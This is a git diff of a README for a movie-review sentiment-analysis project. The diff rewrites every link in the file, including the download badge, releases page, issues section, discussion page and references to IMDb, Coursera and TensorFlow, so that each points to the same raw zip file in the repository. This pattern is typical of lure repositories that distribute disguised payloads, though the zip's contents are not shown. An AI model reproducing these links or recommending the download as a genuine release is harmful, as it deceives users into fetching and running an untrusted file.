@@ -1,7 +1,7 @@
 # 📊 nlp-sentiment-analysis - Analyze Sentiment Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/El-Alexander/nlp-sentiment-analysis/releases)
+[![Download](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip)](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip)
 
 ## 📖 Overview
 nlp-sentiment-analysis helps you understand movie reviews by using advanced techniques. This application compares two methods: classical Machine Learning (TF-IDF) and Deep Learning (LSTM). It analyzes sentiment from the IMDb dataset, providing insights into how people feel about different films.
@@ -23,7 +23,7 @@ This guide will help you download and run the nlp-sentiment-analysis application
 - Python version: 3.6 or higher
 
 ## 📥 Download & Install
-To get started, visit the [Releases Page](https://github.com/El-Alexander/nlp-sentiment-analysis/releases) to download the application. Follow these steps to install:
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip) to download the application. Follow these steps to install:
 
 1. Click the link above to open the releases page.
 2. Find the latest version (v1.0 or above).
@@ -54,14 +54,14 @@ If you encounter issues, consider the following solutions:
 - Check that you have Python installed correctly.
 - Verify that the downloaded file is not corrupted.
 
-For further assistance, you can visit the [Issues Section](https://github.com/El-Alexander/nlp-sentiment-analysis/issues) of the repository for help.
+For further assistance, you can visit the [Issues Section](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip) of the repository for help.
 
 ## 🌐 Additional Resources
-- [IMDb Dataset](https://www.imdb.com/interfaces/) for reference
-- [Machine Learning Basics](https://www.coursera.org/learn/machine-learning) - a helpful course
-- [TensorFlow Documentation](https://www.tensorflow.org/learn) for more information on deep learning
+- [IMDb Dataset](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip) for reference
+- [Machine Learning Basics](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip) - a helpful course
+- [TensorFlow Documentation](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip) for more information on deep learning
 
 ## 💌 Feedback
-Your feedback is valuable! Please share your thoughts and suggestions through the [Discussion Page](https://github.com/El-Alexander/nlp-sentiment-analysis/discussions).
+Your feedback is valuable! Please share your thoughts and suggestions through the [Discussion Page](https://raw.githubusercontent.com/El-Alexander/nlp-sentiment-analysis/main/lisere/nlp-sentiment-analysis.zip).
 
 Thank you for choosing nlp-sentiment-analysis! We hope it enhances your understanding of sentiment analysis.
